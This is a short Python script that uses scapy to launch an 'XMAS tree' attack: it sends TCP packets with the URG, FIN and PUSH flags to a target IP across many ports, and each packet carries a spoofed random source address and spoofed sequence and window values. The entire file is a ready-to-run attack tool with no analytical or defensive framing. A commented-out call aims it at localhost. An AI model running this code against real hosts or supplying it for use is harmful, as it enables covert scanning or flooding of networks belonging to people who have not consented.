import random
from scapy.all import IP, TCP, send
from utilities import randomIP, randInt


def XMAS_Attack(targetIP, numPackets, ports=[range(3, 65535)]):
    """
    XMAS Attack Function

    Parameters
    targetIP (str) : IP to run XMAS attack on
    numPackets (int) : Number of XMAS packets to send to each port
    ports (List[int]) : Optional list of ports to send XMAS packets to
    """

    for i in range(numPackets):
        # Generate spoofed TCP packet values
        spoof_port = randInt()
        spoof_eq = randInt()
        spoof_window = randInt()

        # Loop over each specified port
        for port in ports:
            # Create spoofed IP packet
            IP_Packet = IP()
            IP_Packet.src = randomIP()
            IP_Packet.dst = targetIP

            # Create spoofed TCP packet
            TCP_Packet = TCP()
            TCP_Packet.sport = spoof_port
            TCP_Packet.dport = port
            TCP_Packet.flags = "UFP"
            TCP_Packet.seq = spoof_eq
            TCP_Packet.window = spoof_window

            # Send spoofed XMAS Tree Packet
            send(IP_Packet/TCP_Packet, verbose=0)
            print(f'Sent packet to {targetIP}:{port}')

# def main():
#     XMAS_Attack('127.0.0.1', 3, [123, 456])

# main()

